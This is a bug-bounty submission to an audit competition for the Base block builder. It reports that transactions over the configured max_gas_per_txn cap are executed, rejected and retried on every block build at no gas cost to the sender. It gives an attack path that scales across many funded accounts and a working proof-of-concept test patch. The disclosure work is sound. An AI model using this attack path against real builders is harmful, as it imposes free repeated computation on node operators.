# 76538 bc low post execution max gas per txn rejection retries over cap transactions for free

**Submitted on May 4th 2026 at 19:24:58 UTC by @adeolu for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76538
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

Affected code:

* [`bin/builder/src/cli.rs:63-64`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/builder/src/cli.rs#L63-L64)
* [`bin/builder/src/cli.rs:187`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/builder/src/cli.rs#L187)
* [`crates/builder/core/src/config.rs:45-46`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L45-L46)
* [`crates/builder/core/src/config.rs:124-135`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L124-L135)
* [`crates/builder/core/src/flashblocks/context.rs:820-905`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L820-L905)
* [`crates/builder/core/src/execution.rs:170-194`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L170-L194)
* [`crates/builder/core/src/flashblocks/payload.rs:572-617`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/payload.rs#L572-L617)
* [`crates/builder/core/src/test_utils/utils.rs:50-56`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/test_utils/utils.rs#L50-L56)
* [`crates/builder/core/tests/smoke.rs:213-324`](broken://pages/e5921706ca09bbbe0ec9261ee8716cd2a20ee0bd#L213-L324)

## Summary

`--builder.max_gas_per_txn` is an optional builder-side execution cap. It is disabled by default (`None`), but when an operator enables it, the builder fully executes a candidate transaction first and only then checks whether `gas_used > max_gas_per_txn`.

If the transaction exceeds the configured cap, the builder rejects it before committing state, creating a receipt, pruning it as committed, or charging the sender. The rejection only calls `best_txs.mark_invalid(sender, nonce)` for the current iterator. `TxnExecutionError::MaxGasUsageExceeded` is not classified as permanent, so the transaction hash is not added to `diag.permanently_rejected_txs`, is not inserted into the rejection cache, and is not removed from the builder txpool.

On the next flashblock or block, `refresh_iterator(...)` rebuilds the best-transaction iterator from the same pool. A high-priority over-cap transaction can therefore be selected, fully executed, rejected, and retained again. The attacker pays no gas because the transaction is never mined and the sender nonce never advances.

The direct one-sender impact is a sender-level nonce-chain pin plus repeated builder-side EVM work. With many funded sender accounts, the same condition can be scaled into builder resource pressure: each account supplies a high-priority current-nonce transaction that passes pre-execution checks, consumes EVM time, is rejected after execution, and remains available for retry.

This maps most directly to:

```
High
Causing network processing nodes to process transactions from the mempool beyond set parameters
```

It is configuration-dependent because `max_gas_per_txn` is not enabled by default. The issue is still security-relevant for any builder deployment that enables the advertised cap: the cap becomes a free repeated-computation primitive instead of a one-time exclusion rule.

## Required Conditions

The issue shows when these configs and conditions line up:

* The builder operator enables `--builder.max_gas_per_txn`.
* The attacker can submit normal signed transactions into the builder's txpool.
* The attacker transaction's `gas_limit` is low enough to pass normal pool and block gas checks.
* The transaction's actual EVM `gas_used` exceeds `max_gas_per_txn`.
* The transaction carries enough priority fee to be selected near the top of the builder ordering.
* The transaction is at the sender's current executable nonce. Later same-sender nonces can be pinned behind it, but the repeated-execution primitive is the current-nonce transaction.

The attack does not require a malicious batcher, invalid signatures, bad L1 data, a malicious sequencer, a malicious builder operator, or direct corruption of builder state. The only operator-side condition is enabling the documented builder cap.

## Severity evaluation

Severity: **High when the cap is enabled; configuration-dependent otherwise**.

The builder's configured per-transaction gas cap is intended to bound which transactions the builder includes. Instead, an over-cap transaction can be executed repeatedly after it is known to exceed the cap. That causes the builder to process a mempool transaction beyond the configured parameter on every iterator refresh.

The PoC configures a real in-process builder with `max_gas_per_txn = 25_000` and uses the existing `random_big_transaction()` helper, whose comment states that the transaction uses about `86,220` gas. The transaction passes pre-execution admission with a normal `210,000` gas limit, executes in the EVM, exceeds the configured cap, and is rejected after execution.

The PoC demonstrates:

```
attacker nonce N     = over-cap tx, executed then rejected, retained in pool
attacker nonce N + 1 = normal follow-up tx, retained but pinned behind nonce N
unrelated user tx    = included successfully when the pool is not saturated
attacker balance     = unchanged after repeated block builds
attacker nonce       = unchanged after repeated block builds
```

## Vulnerability Detail

{% stepper %}
{% step %}

### The builder exposes an optional `max_gas_per_txn` cap

Source: [`bin/builder/src/cli.rs:63-64`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/builder/src/cli.rs#L63-L64)

```rust
/// max gas a transaction can use
#[arg(long = "builder.max_gas_per_txn")]
pub max_gas_per_txn: Option<u64>,
```

The CLI value is copied into `BuilderConfig`.

Source: [`bin/builder/src/cli.rs:187`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/builder/src/cli.rs#L187)

```rust
max_gas_per_txn: self.max_gas_per_txn,
```

The default config leaves the cap disabled.

Source: [`config.rs:124-135`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/config.rs#L124-L135)

```rust
impl Default for BuilderConfig {
    fn default() -> Self {
        Self {
            ...
            max_gas_per_txn: None,
```

{% endstep %}

{% step %}

### The cap is checked only after full EVM execution

Source: [`context.rs:820-853`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L820-L853)

```rust
let tx_simulation_start_time = Instant::now();
let ResultAndState { result, state } = match evm.transact(&tx) {
    Ok(res) => res,
    Err(err) => {
        ...
    }
};
```

Only after `evm.transact(&tx)` returns does the builder read `result.gas_used()` and enforce `max_gas_per_txn`.

Source: [`context.rs:880-905`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/context.rs#L880-L905)

```rust
let gas_used = result.gas_used();
...
if let Some(max_gas_per_txn) = self.builder_config.max_gas_per_txn
    && gas_used > max_gas_per_txn
{
    let err = TxnExecutionError::MaxGasUsageExceeded;
    diag.record_rejection(&err);
    let priority_fee = tx.effective_tip_per_gas(base_fee).unwrap_or(0) as f64;
    record_rejected_tx_priority_fee(&err, priority_fee);
    log_txn(Err(err));
    best_txs.mark_invalid(tx.signer(), tx.nonce());
    continue;
}
```

The `continue` happens before cumulative gas is updated, before receipt creation, before state changes are pushed into the payload, and before the transaction is marked committed. The builder has already paid the CPU cost of EVM execution, but the sender is not charged because the transaction is not included.
{% endstep %}

{% step %}

### `MaxGasUsageExceeded` is not permanent

Source: [`execution.rs:170-194`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/execution.rs#L170-L194)

```rust
/// Transaction gas usage exceeds configured maximum.
#[error("max gas usage exceeded")]
MaxGasUsageExceeded,
...
pub const fn is_permanent(&self) -> bool {
    matches!(
        self,
        Self::TransactionDASizeExceeded(_, _)
            | Self::ExecutionMeteringLimitExceeded(
                ExecutionMeteringLimitExceeded::TransactionExecutionTime(_, _),
            )
    )
}
```

Since `MaxGasUsageExceeded` is not matched here, the post-execution rejection is treated as transient.
{% endstep %}

{% step %}

### Only permanent rejections and committed transactions are removed from the pool

Source: [`payload.rs:572-617`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/flashblocks/payload.rs#L572-L617)

```rust
best_txs.refresh_iterator(BestPayloadTransactions::new(
    self.pool.best_transactions_with_attributes(ctx.best_transaction_attributes()),
));
...
if !diag.permanently_rejected_txs.is_empty() {
    best_txs.mark_rejected(&diag.permanently_rejected_txs);
    self.config.metering_provider.remove(&diag.permanently_rejected_txs);
    self.pool.remove_transactions(diag.permanently_rejected_txs.clone());
    ...
}
...
best_txs.mark_committed(&new_transactions);
self.config.metering_provider.remove(&new_transactions);
self.pool.prune_transactions(new_transactions);
```

An over-cap transaction rejected by `MaxGasUsageExceeded` is neither committed nor permanent. Therefore it is not pruned, not removed, and not rejection-cached. A later `refresh_iterator(...)` can select the same transaction again from the same pool.
{% endstep %}

{% step %}

### The PoC transaction is a normal low-gas-limit transaction that burns more than the configured cap

Source: [`utils.rs:50-56`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/builder/core/src/test_utils/utils.rs#L50-L56)

```rust
// This transaction is big in the sense that it uses a lot of gas. The exact
// amount it uses is 86220 gas.
fn random_big_transaction(self) -> Self {
    // PUSH13 0x63ffffffff60005260046000f3 PUSH1 0x00 MSTORE PUSH1 0x02 PUSH1 0x0d PUSH1 0x13 PUSH1 0x00 CREATE2
    self.with_create()
        .with_input(hex!("6c63ffffffff60005260046000f36000526002600d60136000f5").into())
}
```

The test sets the builder cap to `25,000`, while this transaction uses about `86,220` gas. The transaction's gas limit remains the default `210,000`, so it passes ordinary pre-execution gas-limit checks and reaches the vulnerable post-execution branch.
{% endstep %}
{% endstepper %}

## Attack Path

{% stepper %}
{% step %}
A builder deployment enables `--builder.max_gas_per_txn`, for example `25,000`, to exclude expensive individual transactions.
{% endstep %}

{% step %}
The attacker funds one or more normal EOAs.
{% endstep %}

{% step %}
Each attacker EOA submits a signed current-nonce transaction with a high priority fee and code/calldata that uses more gas than the configured cap, while keeping `gas_limit` within normal block and txpool limits.
{% endstep %}

{% step %}
The builder orders the high-priority attacker transaction near the top of the candidate set.
{% endstep %}

{% step %}
The builder fully executes the transaction with `evm.transact(&tx)`.
{% endstep %}

{% step %}
After execution, `gas_used > max_gas_per_txn`, so the builder records `MaxGasUsageExceeded`, calls `best_txs.mark_invalid(sender, nonce)`, and skips committing the transaction.
{% endstep %}

{% step %}
Because the rejection happens before receipt/state commit, the attacker pays no gas and the attacker nonce does not advance.
{% endstep %}

{% step %}
Because `MaxGasUsageExceeded` is not permanent, the transaction is not added to `diag.permanently_rejected_txs`, not removed from the pool, and not rejection-cached.
{% endstep %}

{% step %}
On the next flashblock or block, `refresh_iterator(...)` rebuilds from the same txpool, so the same high-priority over-cap transaction can be selected and executed again.
{% endstep %}

{% step %}
With many funded EOAs, the attacker repeats the same current-nonce pattern across accounts to create sustained builder-side EVM work and keep high-priority over-cap candidates at the front of selection.
{% endstep %}
{% endstepper %}

## Impact

The directly proven impact is repeated builder-side EVM execution beyond a configured per-transaction gas cap, without gas payment by the attacker.

For one sender, the over-cap transaction at nonce `N` also pins that sender's nonce chain: a normal follow-up transaction at `N + 1` remains in the pool but cannot execute because nonce `N` never commits. That is a per-sender liveness issue.

For a broader service-impact scenario, the attacker scales across many funded sender accounts. Each sender contributes a current-nonce over-cap transaction, avoiding the limitation that one sender can only contribute a small number of useful pending nonce slots under default txpool sender limits. The attacker does not need future nonces to create the repeated-computation effect; one current-nonce over-cap transaction per account is enough.

The attacker's direct execution cost is favorable:

```
EVM execution performed by builder: yes
transaction included in block:      no
attacker nonce advances:            no
attacker balance pays gas:          no
transaction remains in txpool:      yes
same tx retryable next refresh:     yes
```

This can increase builder CPU consumption and transaction-selection work while violating the configured `max_gas_per_txn` exclusion semantics.

## Proof of Concept

The PoC is a builder-node E2E test. It starts a real in-process builder node, enables `max_gas_per_txn`, submits an over-cap attacker transaction at nonce `N`, submits a normal same-sender follow-up transaction at nonce `N + 1`, submits unrelated user transactions, builds blocks with the real flashblocks payload builder, and checks the resulting chain and txpool state.

The PoC proves all of the following:

1. The attacker transaction is executed and rejected after exceeding `max_gas_per_txn`.
2. The rejected over-cap transaction remains in the builder txpool after block construction.
3. The same-sender follow-up transaction remains pinned behind the over-cap head nonce.
4. Unrelated user transactions are still included when the pool is not saturated.
5. The attacker balance and nonce remain unchanged after repeated block builds, proving the attacker pays no execution fee and the transaction is never mined.
6. A later block build sees the same retained over-cap transaction condition again, confirming the retry loop.

These steps start from a freshly cloned repository.

### Step 1: clone and checkout the vulnerable version

```bash
git clone https://github.com/base/base.git
cd base
git checkout v0.8.0-rc.28
```

### Step 2: apply the PoC test

Apply this patch from the repository root:

```bash
git apply <<'PATCH'
diff --git a/crates/builder/core/src/test_utils/txs.rs b/crates/builder/core/src/test_utils/txs.rs
--- a/crates/builder/core/src/test_utils/txs.rs
+++ b/crates/builder/core/src/test_utils/txs.rs
@@ -71,6 +71,7 @@
 
     /// Sets an explicit nonce instead of fetching it from the provider.
     pub const fn with_nonce(mut self, nonce: u64) -> Self {
+        self.nonce = Some(nonce);
         self.tx.nonce = nonce;
         self
     }
diff --git a/crates/builder/core/tests/smoke.rs b/crates/builder/core/tests/smoke.rs
--- a/crates/builder/core/tests/smoke.rs
+++ b/crates/builder/core/tests/smoke.rs
@@ -7,16 +7,23 @@
 use std::collections::HashSet;
 
 use alloy_primitives::TxHash;
+use alloy_provider::Provider;
 #[cfg(target_os = "linux")]
 use base_builder_core::test_utils::ExternalNode;
 use base_builder_core::{
     BuilderConfig,
     test_utils::{
-        TransactionBuilderExt, setup_test_instance, setup_test_instance_with_builder_config,
+        BlockTransactionsExt, ChainDriverExt, ONE_ETH, TransactionBuilderExt, setup_test_instance,
+        setup_test_instance_with_builder_config,
     },
 };
 use tokio::{join, task::yield_now};
 use tracing::info;
+
+const MAX_GAS_RETRY_POC_LIMIT: u64 = 25_000;
+const MAX_GAS_ATTACK_PRIORITY_FEE: u128 = 1_000_000_000;
+const MAX_GAS_FOLLOWUP_PRIORITY_FEE: u128 = 1_000_000_000;
+const MAX_GAS_UNRELATED_PRIORITY_FEE: u128 = 1;
 
 /// This is a smoke test that ensures that transactions are included in blocks
 /// and that the block generator is functioning correctly.
@@ -206,6 +213,118 @@
 }
 
 #[tokio::test]
+async fn node_e2e_poc_max_gas_per_txn_post_execution_rejection_retries() -> eyre::Result<()> {
+    let config = BuilderConfig::for_tests().with_max_gas_per_txn(Some(MAX_GAS_RETRY_POC_LIMIT));
+    let rbuilder = setup_test_instance_with_builder_config(config).await?;
+    let driver = rbuilder.driver().await?;
+    let mut accounts = driver.fund_accounts(2, ONE_ETH).await?;
+    let attacker = accounts.pop().expect("attacker account should exist");
+    let unrelated_user = accounts.pop().expect("unrelated user account should exist");
+    let attacker_address = attacker.address();
+    let attacker_initial_balance = driver.provider().get_balance(attacker_address).latest().await?;
+    let attacker_initial_nonce =
+        driver.provider().get_transaction_count(attacker_address).latest().await?;
+
+    let over_cap_tx = driver
+        .create_transaction()
+        .with_signer(&attacker)
+        .with_nonce(attacker_initial_nonce)
+        .random_big_transaction()
+        .with_max_priority_fee_per_gas(MAX_GAS_ATTACK_PRIORITY_FEE)
+        .send()
+        .await?;
+    let over_cap_hash = *over_cap_tx.tx_hash();
+    let followup_tx = driver
+        .create_transaction()
+        .with_signer(&attacker)
+        .with_nonce(attacker_initial_nonce + 1)
+        .random_valid_transfer()
+        .with_max_priority_fee_per_gas(MAX_GAS_FOLLOWUP_PRIORITY_FEE)
+        .send()
+        .await?;
+    let followup_hash = *followup_tx.tx_hash();
+    let first_unrelated_tx = driver
+        .create_transaction()
+        .with_signer(&unrelated_user)
+        .with_to(unrelated_user.address())
+        .with_value(1)
+        .with_max_priority_fee_per_gas(MAX_GAS_UNRELATED_PRIORITY_FEE)
+        .send()
+        .await?;
+
+    let first_block = driver.build_new_block_with_current_timestamp(None).await?;
+
+    assert!(first_block.includes(first_unrelated_tx.tx_hash()));
+    assert!(
+        first_block
+            .transactions
+            .hashes()
+            .all(|included| included != over_cap_hash && included != followup_hash),
+        "over-cap head tx and same-sender follow-up must not be included"
+    );
+    assert!(
+        rbuilder.pool().exists(over_cap_hash),
+        "BUG CONFIRMED: post-execution max-gas rejection is not permanently evicted"
+    );
+    assert!(
+        rbuilder.pool().exists(followup_hash),
+        "same-sender follow-up remains pinned behind the over-cap head nonce"
+    );
+    assert!(
+        !rbuilder.pool().exists(*first_unrelated_tx.tx_hash()),
+        "unrelated tx should be included and pruned while the attacker tx remains"
+    );
+    assert_eq!(
+        driver.provider().get_balance(attacker_address).latest().await?,
+        attacker_initial_balance,
+        "attacker balance should not change because neither same-sender tx is mined"
+    );
+    assert_eq!(
+        driver.provider().get_transaction_count(attacker_address).latest().await?,
+        attacker_initial_nonce,
+        "attacker nonce should not advance after the post-execution rejection"
+    );
+
+    let second_unrelated_tx = driver
+        .create_transaction()
+        .with_signer(&unrelated_user)
+        .with_to(unrelated_user.address())
+        .with_value(1)
+        .with_max_priority_fee_per_gas(MAX_GAS_UNRELATED_PRIORITY_FEE)
+        .send()
+        .await?;
+
+    let second_block = driver.build_new_block_with_current_timestamp(None).await?;
+
+    assert!(second_block.includes(second_unrelated_tx.tx_hash()));
+    assert!(
+        second_block
+            .transactions
+            .hashes()
+            .all(|included| included != over_cap_hash && included != followup_hash),
+        "the same over-cap tx is selected and rejected again on a later block build"
+    );
+    assert!(rbuilder.pool().exists(over_cap_hash));
+    assert!(rbuilder.pool().exists(followup_hash));
+    assert!(
+        !rbuilder.pool().exists(*second_unrelated_tx.tx_hash()),
+        "second unrelated tx should also be included and pruned"
+    );
+    assert_eq!(
+        driver.provider().get_balance(attacker_address).latest().await?,
+        attacker_initial_balance,
+        "attacker still pays no execution fee after repeated block builds"
+    );
+    assert_eq!(
+        driver.provider().get_transaction_count(attacker_address).latest().await?,
+        attacker_initial_nonce,
+        "attacker nonce remains pinned after repeated block builds"
+    );
+
+    Ok(())
+}
+
+#[tokio::test]
 async fn chain_produces_big_tx_without_gas_limit() -> eyre::Result<()> {
     let rbuilder = setup_test_instance().await?;
     let driver = rbuilder.driver().await?;
PATCH
```

The small `with_nonce` helper change in `crates/builder/core/src/test_utils/txs.rs` is only for deterministic test construction. It makes the existing explicit nonce helper set both the transaction field and the builder's internal nonce override. The vulnerability itself is in the builder payload-selection path shown above.

### Step 3: format-check and compile-check the test

```bash
cargo fmt --check -p base-builder-core
cargo check -p base-builder-core --test smoke
```

Expected result:

```
Finished `dev` profile [unoptimized + debuginfo] target(s) in ...
```

The repository's rustfmt config may print warnings about nightly-only options such as `imports_granularity`, `group_imports`, and `trailing_comma`. Those warnings are expected on stable rustfmt; the command should still exit successfully.

### Step 4: run the PoC

```bash
cargo test -p base-builder-core --test smoke node_e2e_poc_max_gas_per_txn_post_execution_rejection_retries -- --nocapture
```

Observed result on a freshly patched checkout:

```
running 1 test
test node_e2e_poc_max_gas_per_txn_post_execution_rejection_retries ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out
```

On macOS, the test process may also print shutdown messages similar to:

```
Warning: failed to remove temporary data directory ... Directory not empty (os error 66)
ERROR engine::tree: Channel disconnected
ERROR engine::persistence: Persistence service failed ...
```

Those shutdown messages occur after the assertions pass and are not part of the vulnerability. The PoC result is the `ok` test status.

### What the PoC demonstrates

The core assertions are:

```rust
assert!(first_block.includes(first_unrelated_tx.tx_hash()));
```

This confirms the pool is not globally blocked in the one-sender case; an unrelated sender can still be included.

```rust
assert!(
    rbuilder.pool().exists(over_cap_hash),
    "BUG CONFIRMED: post-execution max-gas rejection is not permanently evicted"
);
assert!(
    rbuilder.pool().exists(followup_hash),
    "same-sender follow-up remains pinned behind the over-cap head nonce"
);
```

The over-cap transaction and the same-sender follow-up remain in the builder pool after block construction.

```rust
assert_eq!(
    driver.provider().get_balance(attacker_address).latest().await?,
    attacker_initial_balance,
    "attacker balance should not change because neither same-sender tx is mined"
);
assert_eq!(
    driver.provider().get_transaction_count(attacker_address).latest().await?,
    attacker_initial_nonce,
    "attacker nonce should not advance after the post-execution rejection"
);
```

The attacker pays no gas and the nonce does not advance because the over-cap transaction is never mined.

```rust
let second_block = driver.build_new_block_with_current_timestamp(None).await?;
...
assert!(rbuilder.pool().exists(over_cap_hash));
assert!(rbuilder.pool().exists(followup_hash));
```

A later block build still observes the same retained over-cap transaction and pinned follow-up. This is the retry loop.

## Validation

Formatting:

```bash
cargo fmt --check -p base-builder-core
```

Result: passed. The command prints warnings about nightly-only rustfmt options in the repository config, but exits successfully.

Compile check:

```bash
cargo check -p base-builder-core --test smoke
```

Result: passed.

Builder-node E2E PoC:

```bash
cargo test -p base-builder-core --test smoke node_e2e_poc_max_gas_per_txn_post_execution_rejection_retries -- --nocapture
```

Result: passed.

The local workspace used for validation contained additional PoC tests, so its final test summary reported a different `filtered out` count than a fresh checkout. The vulnerability assertions and the `ok` status are the relevant result.

## Recommended Mitigation

Do not allow a transaction that has already exceeded the configured per-transaction gas cap to re-enter selection on the next iterator refresh.
